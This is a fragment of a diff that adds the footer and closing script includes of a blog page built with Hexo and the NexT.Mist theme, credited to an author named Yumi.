+  <span class="author" itemprop="copyrightHolder">Yumi</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://mist.theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Mist</a>
+  </div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/muse.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
